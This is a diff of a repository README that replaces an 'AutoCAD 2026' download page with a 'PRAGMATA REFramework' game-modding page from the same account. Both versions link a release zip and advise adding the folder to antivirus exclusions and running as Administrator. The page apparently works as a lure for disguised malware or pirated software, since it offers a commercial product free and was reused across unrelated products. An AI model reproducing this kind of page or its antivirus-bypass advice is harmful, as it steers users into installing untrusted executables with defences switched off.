@@ -1,45 +1,45 @@
-<img width="1536" height="1024" alt="ChatGPT Image 27 апр  2026 г , 18_31_13(1)" src="https://github.com/user-attachments/assets/421be564-eaf0-4448-9418-50cd3170c559" />
+<img width="1701" height="925" alt="ChatGPT Image 27 апр  2026 г , 18_44_44(1)" src="https://github.com/user-attachments/assets/d774d399-58fe-44d6-8db5-011980382533" />
 
-# AutoCAD 2026
+# PRAGMATA REFramework
 
-> **AutoCAD 2026** — Professional CAD software for 2D drafting, 3D modeling, design, and documentation.
+> **PRAGMATA REFramework** — Advanced modding framework and script loader for Pragmata.
 
-[![Stars](https://img.shields.io/github/stars/mostafamo123/3D-Modeling-Software)](https://github.com/mostafamo123/3D-Modeling-Software) [![License: MIT](https://img.shields.io/badge/License-MIT-red.svg)](https://opensource.org/licenses/MIT)
+[![Stars](https://img.shields.io/github/stars/mostafamo123/Pragmata-Reframework)](https://github.com/mostafamo123/Pragmata-Reframework) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
 
-**AutoCAD 2026** is the latest version of the world’s leading computer-aided design software. It offers powerful tools for precise 2D drafting, advanced 3D modeling, automation, and collaboration, with improved performance and a modern interface optimized for Windows.
+**PRAGMATA REFramework** is a powerful modding framework for Pragmata that enables Lua scripting, advanced mod support, graphics enhancements, and various quality-of-life improvements. It serves as the foundation for running custom scripts, RenoDX presets, trainers, and community mods.
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c8576334-6c95-4842-a518-51cee5468481" />
+<img width="1300" height="372" alt="image" src="https://github.com/user-attachments/assets/c90c794a-e9a7-47d4-bd1c-f44838b11cfa" />
 
 ---
 ## 📦 What's Included
 
-- Optimized build for Windows 10/11
-- Support for high resolutions and widescreen displays
-- Improved performance and stability
-- Industry-specific toolsets
-- Modern dark theme interface
+- Latest compatible REFramework build
+- Full Lua scripting support
+- Native mod loading system
+- Developer console and debug tools
+- RenoDX renderer compatibility
+- Easy installation
 
 ---
 ## 📥 Download
-
-📥 [`AutoCad2026.zip`](https://github.com/mostafamo123/3D-Modeling-Software/releases/download/3D-Modeling/AutoCad2026.zip)
---
-> ℹ️ Optimized for Windows 10 and Windows 11. Recommended: 16 GB RAM or higher.
+📥 [`PragmatREFramework.zip`](https://github.com/mostafamo123/Pragmata-Reframework/releases/download/Game-Modding/PragmatREFramework.zip)
+-
+> ℹ️ Requires the latest version of Pragmata. Best used together with RenoDX for graphics enhancements.
 
 ---
 ## ❗️ Troubleshooting
-| Problem                  | Solution                                      |
-|--------------------------|-----------------------------------------------|
-| Application doesn't start| Run as Administrator                          |
-| Slow performance         | Close background programs or increase RAM     |
-| Graphics issues          | Update GPU drivers                            |
-| Antivirus warning        | Add the folder to exclusions                  |
-| Interface looks blurry   | Adjust DPI scaling in compatibility settings  |
+| Problem                    | Solution                                      |
+|----------------------------|-----------------------------------------------|
+| REFramework not loading    | Ensure the game is running in DirectX 12 mode |
+| Mods not appearing         | Place mods in the `reframework/autorun` folder |
+| Game crashes on startup    | Run the game as Administrator                 |
+| No console window          | Enable console in REFramework settings        |
+| Antivirus warning          | Add the folder to exclusions                  |
 
 ---
 ## 📜 License
-MIT License – shared for educational and preservation purposes only.
+MIT License – shared for educational and modding community purposes only.
 
 ---
 ## ⭐️ Support
-If **AutoCAD 2026** helped you with your design and engineering projects — please star the repository! It helps more professionals access this version. ❤️
+If **PRAGMATA REFramework** helped you explore new possibilities in modding Pragmata — please star the repository! It helps more players enjoy the game with custom content. ❤️
